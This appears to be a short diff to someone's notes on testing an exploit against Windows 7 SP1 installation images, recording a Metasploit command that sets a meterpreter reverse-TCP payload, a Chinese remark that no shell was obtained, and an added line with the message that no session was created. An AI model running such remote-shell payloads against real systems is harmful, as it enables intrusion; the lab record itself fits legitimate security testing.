@@ -42,3 +42,5 @@ cn_windows_7_professional_with_sp1_x86_dvd_u_677162.iso  2011-05-12
 
 cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso    2011-05-12  set payload windows/meterpreter/reverse_tcp 没有蓝屏但是没有得到shell
 
+tishi  Exploit completed, but no session was created.
+
